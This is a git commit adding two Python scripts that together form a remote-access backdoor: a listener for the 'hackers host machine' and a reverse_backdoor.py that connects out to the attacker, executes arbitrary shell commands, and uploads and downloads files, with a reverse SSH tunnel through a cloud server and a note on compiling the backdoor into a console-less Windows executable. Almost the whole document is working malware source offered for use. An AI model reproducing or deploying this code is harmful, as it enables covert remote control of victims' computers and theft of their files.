aca29c0f161ff2ff683f725b9a21edb0e026fae9
NNONA Calister PTX FIIO5 <calister.nnona@zf.com>
2024-11-07 16:25:14 +0100

    uploaded scripts

---
+++ listener.py
@@ -0,0 +1,83 @@
+#!/usr/bin/python
+
+#This script should be run in the hackers host machine where they intend to remotely access the victim system/s from.
+
+import socket, json, base64, subprocess, sys, time
+
+class Listener:
+    def setup_reverse_ssh_tunnel():
+        command = ["autossh", "f", "-N", "-R", "6000:localhost:5000", "user@"+cloud_server_ip]
+        while True:
+            try:
+                subprocess.Popen(command)
+                print("Reverse SSH tunnel established.")
+            except Exception as e:
+                print(f"Error establishing reverse SSH tunnel: {e}")
+
+    def __init__(self, hacker_ip, hacker_port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((hacker_ip, hacker_port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connections")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    #send command to backdoor
+    def send_to_backdoor(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+    
+    #receive returned output from backdoor
+    def receive_from_backdoor(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    #remotely executes command in the backdoor/victim system and displays output in the listener
+    def execute_remotely(self, command):
+        self.send_to_backdoor(command)
+        if command[0] == "exit":
+            self.connection.close() #close the socket
+            exit() # exit the python program
+        return self.receive_from_backdoor()
+    
+    #function for malware download feature
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
+
+    #function for malware upload feature
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            command = command.split(" ")
+
+            try:
+                # if first input argument is upload, run the malware upload function
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                    
+                # run execute remotely function to exceute the command entered in the listener and store the returned output in result
+                result = self.execute_remotely(command)
+                
+                # if first input argument is download, run the malware download function
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result) #result is whatever write_file() returns which in this case is "[+] Download successful."
+            except Exception:
+                result = "[-] Error during command execution."
+
+            print(result) #returns "[+] Download successful."
+
+
+cloud_server_ip = input("Enter the public IP address of the server running your SSH reverse tunnel: ")
---
+++ reverse_backdoor.py
@@ -0,0 +1,76 @@
+#!/usr/bin/env python
+# setup listening in backdoor server nc -lvp 4444 if using netcat
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys
+
+class Backdoor:
+    # establish TCP socket
+    def __init__(self, victim_ip, victim_port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((victim_ip, victim_port))
+
+    def send_to_listener(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+    
+    def receive_from_listener(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) 
+    
+    def change_working_directory(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+        
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful."
+
+    def run(self):
+        while True:
+            command = self.receive_from_listener()
+
+            try:
+                if command[0] == "exit":
+                    self.connection.close() #close the socket
+                    sys.exit() #exit the program
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1]).decode()
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command).decode()
+            except Exception:
+                command_result = "[-] Error during command execution."
+
+            self.send_to_listener(command_result)
+
+ssh_tunnel = input("Enter the IP address of the server running your SSH reverse tunnel: ")
+ssh_port = int(input("Enter the port of the SSH reverse tunnel: "))
+my_backdoor = Backdoor(ssh_tunnel, ssh_port)
+my_backdoor.run()
+
+"""
+converting python code into an executable in windows:
+Install pyinstaller in your system: C:\Python27\python.exe -m pip install pyinstaller # find the name of the file path where python is installed
+Then compile into an exec: C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole # find the path of pyinstaller.exe
+--onefile ensures that reverse_door.py is compiled into one executable file
+"""
